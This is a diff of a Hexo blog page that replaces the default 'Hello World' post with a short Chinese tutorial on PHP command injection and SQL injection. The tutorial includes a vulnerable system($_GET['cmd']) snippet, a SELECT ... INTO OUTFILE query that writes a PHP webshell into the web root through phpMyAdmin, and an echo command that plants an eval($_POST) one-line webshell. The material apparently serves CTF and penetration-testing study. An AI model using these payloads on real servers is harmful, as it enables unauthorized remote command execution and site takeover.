@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="sql,php," />
 
 
 
@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
-<meta name="keywords">
+<meta name="description" content="利用sql注入不仅能够查找数据库中指定数据 获取flag在渗透网站时利用sql结合php语句注入拿到shell">
+<meta name="keywords" content="sql,php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://Merl1ng.com/2017/04/12/hello-world/index.html">
+<meta property="og:title" content="php结合sql注入">
+<meta property="og:url" content="http://Merl1ng.com/2017/08/03/php结合sql注入/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
-<meta property="og:updated_time" content="2017-07-25T06:15:29.963Z">
+<meta property="og:description" content="利用sql注入不仅能够查找数据库中指定数据 获取flag在渗透网站时利用sql结合php语句注入拿到shell">
+<meta property="og:updated_time" content="2017-08-03T13:30:25.941Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta name="twitter:title" content="php结合sql注入">
+<meta name="twitter:description" content="利用sql注入不仅能够查找数据库中指定数据 获取flag在渗透网站时利用sql结合php语句注入拿到shell">
 
 
 
@@ -131,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/04/12/hello-world/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2017/08/03/php结合sql注入/"/>
 
 
 
 
 
-  <title>Hello World | Merl1ng</title>
+  <title>php结合sql注入 | Merl1ng</title>
   
 
 
@@ -266,7 +266,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/04/12/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/08/03/php结合sql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Saber">
@@ -283,7 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hello World</h1>
+          <h1 class="post-title" itemprop="name headline">php结合sql注入</h1>
         
 
         <div class="post-meta">
@@ -295,8 +295,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-12T23:50:25+08:00">
-                2017-04-12
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-03T19:19:17+08:00">
+                2017-08-03
               </time>
             
 
@@ -305,6 +305,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -330,15 +352,19 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.<br><a id="more"></a></p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <p>利用sql注入不仅能够查找数据库中指定数据 获取flag<br>在渗透网站时利用sql结合php语句注入拿到shell<br><a id="more"></a></p>
+<h4 id="php注入漏洞"><a href="#php注入漏洞" class="headerlink" title="php注入漏洞"></a>php注入漏洞</h4><p>使用sql语句漏洞 需要先了解php注入漏洞</p>
+<p>PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz! DedeCMS等都曾经存在过该类型漏洞</p>
+<p>System：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下：</p>
+<p>string system(string command, int &amp;return_var)</p>
+<p>其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。</p>
+<p>按照PHP程序员的想法，命令执行函数的主要作用是可以通过命令执行函数与Web应用程序进行交互，通过Web应用程序执行外部程序或系统命令，如Web应用程序员想通过system函数获取指定目录的文件内容，那么他可以通过构造如下代码实现<br>php页面有如下代码 <code>&lt;? $cmd = $_GET[&quot;cmd&quot;];echo &quot;&lt;pre&gt;&quot;;system($cmd);echo &quot;&lt;/pre&gt;&quot;;?&gt;</code></p>
+<p>而我们就可以在浏览器中访问该网站的这个php文件 并提交cmd的内容为“net start” 目的是通过命令注入攻击查看Web服务器主机都开启了哪些服务<br>提交cmd内容为“phpinfo()” 查看当前php环境相关信息</p>
+<p>在PHP中，可以实现执行外部程序或函数的命令执行函数包括5个函数 除了上面列出的这种 还有几种就不一一列举</p>
+<h4 id="结合sql语句拿shell"><a href="#结合sql语句拿shell" class="headerlink" title="结合sql语句拿shell"></a>结合sql语句拿shell</h4><p>渗透过程中如果发现网站使用了PhpMyAdmin 可以找到执行sql语句的地方<br>还需要查看服务器信息 得到网站的路径<br>假设网站路径为C:/UPUPW/UPUPW_K2.1_64/htdocs</p>
+<p>写入如下代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select load_file(<span class="string">'C:/UPUPW/UPUPW_K2.1_64/htdocs/log.php'</span>);</div><div class="line">select <span class="string">'&lt;?php echo \'</span>&lt;pre&gt;\<span class="string">';system($_GET[\'</span>cmd\<span class="string">']); echo \'</span>&lt;/pre&gt;\<span class="string">'; ?&gt;'</span> INTO OUTFILE <span class="string">'C:/UPUPW/UPUPW_K2.1_64/htdocs/log.php'</span></div></pre></td></tr></table></figure></p>
+<p>拿到cmd权限 现在只要在cmd=后面加上命令即可写入一句话再连接菜刀即可<br>写入 <code>echo ^&lt;^?php eval($_POST[qaq]);?^&gt;^ &gt;&gt;aa.php</code><br>通过执行以下命令，即可在当前目录下产生一个文件名为aa.php。密码为qaq的webshell</p>
+<p>参考文章<br><a href="http://www.rising.com.cn/newsletter/news/2012-06-27/11810.html" target="_blank" rel="external">http://www.rising.com.cn/newsletter/news/2012-06-27/11810.html</a><br><a href="https://www.server110.com/web_sec/201407/10799.html" target="_blank" rel="external">https://www.server110.com/web_sec/201407/10799.html</a></p>
 
       
     </div>
@@ -366,6 +392,14 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/sql/" rel="tag"># sql</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
+      
 
       
       
@@ -375,15 +409,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/04/30/环境变量/" rel="next" title="环境变量">
-                <i class="fa fa-chevron-left"></i> 环境变量
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/02/一道sql注入/" rel="prev" title="一道sql注入">
+                一道sql注入 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -533,7 +567,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#php注入漏洞"><span class="nav-number">1.</span> <span class="nav-text">php注入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#结合sql语句拿shell"><span class="nav-number">2.</span> <span class="nav-text">结合sql语句拿shell</span></a></li></ol></div>
             
 
           </div>
